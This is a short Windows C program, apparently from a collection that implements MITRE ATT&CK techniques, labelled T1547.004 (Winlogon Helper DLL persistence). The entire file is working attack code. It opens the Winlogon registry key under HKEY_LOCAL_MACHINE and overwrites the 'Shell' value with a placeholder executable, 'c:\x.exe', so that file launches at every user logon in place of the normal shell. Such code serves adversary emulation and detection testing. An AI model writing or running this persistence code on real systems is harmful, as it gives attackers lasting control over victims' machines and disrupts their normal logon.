// Link      = https://attack.mitre.org/techniques/T1547/004/
// Technique = Boot or Logon Autostart Execution: Winlogon Helper DLL
// ID        = T1547.004
// Tactics   = Persistence,

#include <windows.h>

#define KEY_PATH "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"

#define TO_RUN "c:\\x.exe"

int main() {
    HKEY hKey;

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, KEY_PATH, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return 1;
    }
    RegSetValueExA(hKey, "Shell", 0, REG_SZ, (const BYTE*)TO_RUN, sizeof(TO_RUN) + 1);
    RegCloseKey(hKey);

    return 0;
}
